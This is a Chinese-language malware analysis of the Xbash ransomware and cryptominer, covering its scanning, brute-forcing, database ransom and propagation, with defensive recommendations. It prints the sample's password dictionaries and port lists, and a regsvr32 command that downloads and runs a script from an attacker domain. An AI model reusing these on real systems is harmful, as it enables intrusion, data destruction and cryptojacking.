## 一、事件背景

 **Unit42安全研究团队发现了一款针对Linux和Microsoft
Windows服务器的新型恶意样本，Xbash拥有勒索软件和核心功能，同时它还具备自我传播的功能。Xbash主要通过攻击弱密码和未修补的漏洞进行传播。**

## 二、样本分析

样本是用Python语言进行开发编写，然后转化为PE文件，这样主要是为了做免杀处理，同时也具备跨平台的特性。

获取到相应的样本之后，解密提取出程序中的核心PY脚本，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443426_5ba3866284b43.png!small)

1.通过<http://ejectrift.censys.xyz/cidir>获取公网IP地址段，然后进行端口扫描，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443436_5ba3866cb699c.png!small)

扫描的端口号列表如下：

>
> 873,3306,5432,6379,27017,8161,8088,8000,8080,8888,5900,5901,5902,9900,9901,9902

2.对相应的WEB服务端口进行扫描，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443445_5ba38675c62d8.png!small)

相应的端口服务，列表如下：

> HTTP：8088,8000,8080,80
>
> VNC:5900,5901,5902,9900,9901,9902
>
> RDP:3389
>
> Oracle:1521
>
> Rsync:873
>
> Mssql:1433
>
> Mysql:306
>
> Postgresql:5432
>
> Redis:6379,7379
>
> Elasticsearch:9200
>
> Memcached:11211
>
> Mongodb:27017

3.然后对扫描到的WEB服务，进行暴力破解，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443455_5ba3867fc3453.png!small)

4.使用内置的弱用户名和密码字典，暴力破解登录相应的服务，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443463_5ba38687caebb.png!small)相应的WEB服务列表如下：

> Rsync，VNC，phpmyadmin，MySQL，postgresql，mongodb，redis

使用到的相应的弱用户名列表如下：

    
    
    USER_DIC = {'mysql': ['root'],
    
     'postgresql': ['postgres', 'admin'],
    
     'mongodb': ['admin'],
    
     'redis': ['null']}

弱密码列表如下：

    
    
    PASSWORD_DIC = ['test',
    
     'neagrle',
    
     '123456',
    
     'admin',
    
     'root',
    
     'password',
    
     '123123',
    
     '123',
    
     '1',
    
     '{user}',
    
     '{user}{user}',
    
     '{user}1',
    
     '{user}123',
    
     '{user}2016',
    
     '{user}2015',
    
     '{user}!',
    
     '',
    
     'P@ssw0rd!!',
    
     'qwa123',
    
     '12345678',
    
     'test',
    
     '123qwe!@#',
    
     '123456789',
    
     '123321',
    
     '1314520',
    
     '666666',
    
     'woaini',
    
     'fuckyou',
    
     '000000',
    
     '1234567890',
    
     '8888888',
    
     'qwerty',
    
     '1qaz2wsx',
    
     'abc123',
    
     'abc123456',
    
     '1q2w3e4r',
    
     '123qwe',
    
     '159357',
    
     'p@ssw0rd',
    
     'p@55w0rd',
    
     'password!',
    
     'p@ssw0rd!',
    
     'password1',
    
     'r00t',
    
     'tomcat',
    
     'apache',
    
     'system']
    
    MY_PASSWORD = ['summer',
    
     '121212',
    
     'jason',
    
     'admin123',
    
     'goodluck123',
    
     'peaches',
    
     'asdfghjkl',
    
     'wang123456',
    
     'falcon',
    
     'www123',
    
     '1qazxsw2',
    
     '112211',
    
     'fuckyou',
    
     'test',
    
     'silver',
    
     '123456789',
    
     '234567',
    
     '1122334455',
    
     'xxxxxx',
    
     '123321',
    
     '7788521',
    
     '123456qaz',
    
     'hunter',
    
     'qwe123',
    
     '123',
    
     'asdf123',
    
     'password',
    
     '1q2w3e4r',
    
     'nihao123',
    
     'aaaa1111',
    
     '123123',
    
     '147258369',
    
     'a123',
    
     '123qwe',
    
     '1234abcd',
    
     'spider',
    
     'qqaazz',
    
     'qwertyuiop',
    
     '1234qwer',
    
     '123abc',
    
     'qwer1234',
    
     'mustang',
    
     '123456',
    
     '123456a',
    
     'ww123456',
    
     '1234',
    
     '123456.com',
    
     'football',
    
     'jessica',
    
     'power',
    
     'q1w2e3r4t5',
    
     'aaa123',
    
     'passw0rd',
    
     '741852',
    
     '666666',
    
     '123465',
    
     'justin',
    
     '!@#$%^&*()',
    
     '12345',
    
     '222222',
    
     'qazwsx123',
    
     '999999',
    
     'abc123',
    
     'tomcat',
    
     'dongdong',
    
     '654321',
    
     '111111a',
    
     'q1w2e3',
    
     'dragon',
    
     '1234560',
    
     '1234567',
    
     'asd123456',
    
     'secret',
    
     'abc123456',
    
     'master',
    
     'qq123456',
    
     '1q2w3e',
    
     'playboy',
    
     'P@ssw0rd',
    
     '123654',
    
     '88888888',
    
     '12345678',
    
     'orange',
    
     'rabbit',
    
     'jonathan',
    
     '000000',
    
     'qwer',
    
     'admin',
    
     'asdfasdf',
    
     '1234567890',
    
     '709394',
    
     '12qwaszx',
    
     'abcd1234',
    
     'pass',
    
     'fuck',
    
     'abc12345',
    
     'qweasdzxc',
    
     'abcdef',
    
     'superman',
    
     'rainbow',
    
     '11111111111',
    
     '1',
    
     '321',
    
     '888888',
    
     '1qaz2wsx',
    
     'test',
    
     '112233',
    
     'qazwsx',
    
     'welcome',
    
     '4815162342',
    
     'tiger',
    
     'wangyang',
    
     'q1w2e3r4',
    
     '111111',
    
     'a123456',
    
     'hello',
    
     '123456654321']
    
    PASSWORD_DIC.extend(MY_PASSWORD)

5.如果成功登录到MySQL，MongoDB，PostgreSQL等WEB服务，会删除服务器中的数据库，然后创建一个勒索信息的新数据库，并写入一条勒索信息到新的数据库表中，如下所示：

针对MongoDB数据库的勒索：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443483_5ba3869bbf0b1.png!small)针对PostgreSQL数据库的勒索：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443493_5ba386a5c8ee6.png!small)针对MySQL数据库的勒索，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443501_5ba386adcc546.png!small)相应的勒索信息钱包地址和邮件地址如下：

> 'Bitcoin_Address': '1Kss6v4eSUgP4WrYtfYGZGDoRsf74M7CMr',
>
> 'Email': 'backupsql@protonmail.com'

6.针对内网进行扫描，获取本地网络信息，然后生成同一个子网内的IP地址列表，进行扫描，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443512_5ba386b8dd193.png!small)内网扫描的相应端口号如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443522_5ba386c20d7c4.png!small)

> 端口号：6379,8161,8088,8000,8080,8888

7.利用几个相关漏洞进行传播，如下所示：

Hadoop YARN ResourceManager未经身份验证的命令执行：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443530_5ba386cae9050.png!small)ActiveMQ任意文件写入漏洞：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443541_5ba386d505d65.png!small)Redis任意文件写入和远程命令执行：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443549_5ba386dde540e.png!small)

写入执行，相应的crontab，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443558_5ba386e607d32.png!small)通过相应的漏洞进行感染其它系统的时候会同时感染相应的Window服务器，利用Windows的系统特性进行感染，相应的Windows命令如下：

> regsvr32 /s /n /u /i:<http://d3goboxon32grk2l.tk/reg9.sct> scrobj.dll

8.写入相应的crontab自启动项，设置定时任务，从网上下载相应的挖矿脚本，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443567_5ba386efd4ae1.png!small)

9.下载的相应的挖矿脚本如下：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443582_5ba386fe7d1e8.png!small)先干掉其它的Linux系统下的各种挖矿家族，包括之前的(DDG挖矿家族)，然后再下载自己的挖矿程序，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443592_5ba387081d349.png!small)挖矿的端口号：3333,5555,7777,14444

10.Windows上的下载执行挖矿流程，设置自启动脚本reg9_sct，其实是一个PowerShell脚本，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443600_5ba38710f2ca2.png!small)解密出相应脚本之后，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443609_5ba38719cfede.png!small)

再次进行解密，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443617_5ba38721a5311.png!small)tmp.ps1脚本,内容如下：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443623_5ba387279c589.png!small)解密出相应的PowerShell脚本，如下：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443635_5ba38733e2979.png!small)会下载相应的tmp.jpg恶意程序，同时设置相应的Windows计划任务，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443648_5ba3874092327.png!small)11.tmp.jpg是一个64位的程序，使用VMP加壳，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443658_5ba3874a45a78.png!small)经过分析是一个挖矿的程序，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443667_5ba387536d001.png!small)相应的挖矿操作，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443675_5ba3875ba28dc.png!small)挖矿对应的字符串，如下所示：

![Xbash勒索挖矿样本分析](https://image.3001.net/images/20180920/1537443684_5ba38764c9bca.png!small)

## 三、解决方案

> 1、更改账户密码，设置强密码，避免使用统一的密码，因为统一的密码会导致一台被攻破，多台遭殃。
>
>
> 2、如果业务上能不使用RDP的，则建议关闭RDP。当出现此类事件时，推荐使用深信服防火墙，或者终端检测响应平台（EDR）的微隔离功能对3389等端口进行封堵，防止扩散！
>
> 3、深信服防火墙、终端检测响应平台（EDR）均有防爆破功能，防火墙开启此功能并启用相应的规则，EDR开启防爆破功能可进行防御。
>
> 4、建议对全网进行一次安全检查和杀毒扫描，加强防护工作。
>
> 5、普通用户，可下载如下工具，进行查杀。

 ***本文作者：千里目安全实验室，转载请注明来自 FreeBuf.COM**

